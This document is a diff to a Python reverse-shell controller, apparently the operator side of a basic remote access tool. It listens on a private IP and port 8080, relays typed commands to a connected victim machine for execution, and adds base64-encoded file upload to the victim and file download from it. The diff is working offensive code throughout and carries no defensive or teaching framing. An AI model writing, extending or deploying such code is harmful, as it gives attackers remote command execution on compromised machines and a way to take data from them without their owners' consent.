@@ -1,94 +1,106 @@
 import socket
 import os
-import ctypes
-
-def check_admin_access():
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin() != 0    # Windows admin check (non-zero = admin)
-    except Exception as e:
-        return f"Error checking admin status: {e}"           # Handle any exceptions during check
+import base64
 
 def connect():
-    print("=" * 50)
-    print("[+] Listening for incoming TCP connections on port 8080")
-    mySocket = socket.socket()
-    mySocket.bind(("192.168.83.128", 8080)) 
-    mySocket.listen(1)
-    connection, address = mySocket.accept()
-    print("=" * 50)
-    print(f"Connection established: {address}")
-    print("Type 'help' to see available commands")
+    print("[+] Starting server on port 8080...")
+    server_socket = socket.socket()
+    server_socket.bind(("192.168.83.128", 8080))
+    server_socket.listen(1)
+    connection, address = server_socket.accept()
+    print(f"[+] Connection from {address}")
+    
+    # Get initial system info
+    print(connection.recv(1024).decode())
+    print("[+] Type 'help' to see commands")
     
     while True:
         try:
             command = input("Shell > ")
             
-            # Help menu with available commands
             if command == "help":
-                print("\nAvailable Commands:")
-                print("  pwd            - Show current working directory on target")
-                print("  ls             - List files and folders in current directory")
-                print("  cd <directory> - Change directory on target")
-                print("  checkUserLevel - Check admin privileges on target")
-                print("  terminate      - Close the connection and exit")
-                print("  <command>      - Execute any other system command on target\n")
+                print("\nCommands:")
+                print("  pwd - Get current directory")
+                print("  ls - List files")
+                print("  cd <dir> - Change directory")
+                print("  checkadmin - Check privileges")
+                print("  upload <local> <remote> - Send file to target")
+                print("  download <remote> <local> - Get file from target")
+                print("  terminate - Exit\n")
                 continue
-            
-            # Check admin privileges locally
-            elif command == "checkUserLevel":
-                is_admin = check_admin_access()
-                print(f"Admin privileges: {'YES' if is_admin else 'NO'}")
-                continue
-            
-            # List current directory contents
-            elif command == "ls":
-                connection.send("dir".encode())  # Windows equivalent of ls
-                response = connection.recv(5000).decode()
-                print(response)
                 
-            # Get current working directory
-            elif command == "pwd":
-                connection.send("cd".encode())  # Windows command to show current directory
-                response = connection.recv(5000).decode()
-                print(response)
-                
-            # Close connection
-            elif "terminate" in command:
+            if command == "terminate":
                 connection.send("terminate".encode())
-                connection.close()
-                print("Connection terminated")
                 break
                 
-            # Handle all other commands
+            # Handle file upload
+            elif command.startswith("upload "):
+                parts = command.split(" ", 2)
+                if len(parts) != 3:
+                    print("[!] Usage: upload <local> <remote>")
+                    continue
+                
+                local_file, remote_path = parts[1], parts[2]
+                
+                if not os.path.exists(local_file):
+                    print(f"[!] File not found: {local_file}")
+                    continue
+                    
+                with open(local_file, "rb") as f:
+                    file_data = f.read()
+                
+                encoded_data = base64.b64encode(file_data).decode()
+                connection.send(f"upload {remote_path} {encoded_data}".encode())
+                print(connection.recv(1024).decode())
+                
+            # Handle file download
+            elif command.startswith("download "):
+                parts = command.split(" ", 2)
+                if len(parts) != 3:
+                    print("[!] Usage: download <remote> <local>")
+                    continue
+                
+                remote_file, local_path = parts[1], parts[2]
+                connection.send(f"download {remote_file}".encode())
+                
+                response = connection.recv(1024).decode()
+                if response.startswith("[!]"):
+                    print(response)
+                    continue
+                
+                print(response)  # Print file info
+                
+                # Receive file data
+                file_data = ""
+                while True:
+                    chunk = connection.recv(4096).decode()
+                    if chunk.endswith("ENDOFFILE"):
+                        file_data += chunk[:-9]
+                        break
+                    file_data += chunk
+                
+                if file_data.startswith("BASE64:"):
+                    decoded_data = base64.b64decode(file_data[7:])
+                    with open(local_path, "wb") as f:
+                        f.write(decoded_data)
+                    print(f"[+] File saved to {local_path}")
+                
+            # All other commands
             else:
                 connection.send(command.encode())
-                response = connection.recv(8192).decode()  # Increased buffer size
-                if not response:
-                    print("Connection may have been closed by the client")
-                    break
-                print(response)
+                print(connection.recv(4096).decode())
                 
-        except BrokenPipeError:
-            print("Connection lost - the client has disconnected")
-            break
-        except ConnectionResetError:
-            print("Connection was reset by the client")
-            break
         except Exception as e:
-            print(f"An error occurred: {e}")
+            print(f"[!] Error: {e}")
             break
     
-    # Always ensure the socket is closed properly
-    try:
-        connection.close()
-    except:
-        pass
-
-def main():
-    try:
-        connect()
-    except Exception as e:
-        print(f"Failed to establish connection: {e}")
+    connection.close()
+    print("[+] Connection closed")
 
 if __name__ == "__main__":
-    main()
+    try:
+        connect()
+    except KeyboardInterrupt:
+        print("\n[!] Exiting...")
+    except Exception as e:
+        print(f"[!] Error: {e}")
